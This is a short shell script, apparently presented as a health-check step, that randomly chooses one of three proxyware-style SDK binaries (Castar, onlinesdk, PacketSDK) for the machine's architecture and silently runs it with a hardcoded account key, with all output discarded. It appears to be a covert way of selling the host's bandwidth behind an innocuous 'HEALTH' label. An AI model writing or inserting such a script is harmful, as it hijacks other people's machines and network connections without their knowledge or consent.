#!/bin/sh
set -eu

HEALTH_CASTAR_KEY="cskew9gCXwYXER"
HEALTH_ONLINK_KEY="okB7oVsUgLmoo4"
HEALTH_PACKET_KEY="bqT0b1DmYeHZHhCd"

SDK_CHOICE=$(awk 'BEGIN {srand(); print int(rand() * 3) + 1}')
ARCH="$(uname -m)"

case "$SDK_CHOICE" in
  1)
    case "$ARCH" in
      x86_64)        BIN="CastarSdk_amd64" ;;
      aarch64|arm64) BIN="CastarSdk_arm" ;;
      i386|i686)     BIN="CastarSdk_386" ;;
      *) exit 0 ;;
    esac
    exec /opt/castar/$BIN -key="$HEALTH_CASTAR_KEY" >/dev/null 2>&1
    ;;
  2)
    case "$ARCH" in
      x86_64)        BIN="onlinesdk_amd64" ;;
      aarch64|arm64) BIN="onlinesdk_arm64" ;;
      armv7l|arm)    BIN="onlinesdk_arm" ;;
      i386|i686)     BIN="onlinesdk_x86_32" ;;
      *) exit 0 ;;
    esac
    exec /opt/onlink/$BIN "$HEALTH_ONLINK_KEY" >/dev/null 2>&1
    ;;
  3)
    case "$ARCH" in
      x86_64)        BIN="PacketSDK_amd64" ;;
      aarch64|arm64) BIN="PacketSDK_arm64" ;;
      armv7l|arm)    BIN="PacketSDK_arm" ;;
      armv6l)        BIN="PacketSDK_armv6" ;;
      armv5l)        BIN="PacketSDK_armv5" ;;
      i386|i686)     BIN="PacketSDK_x86_32" ;;
      *) exit 0 ;;
    esac
    exec /opt/packetsdk/$BIN -appkey="$HEALTH_PACKET_KEY" >/dev/null 2>&1
    ;;
esac
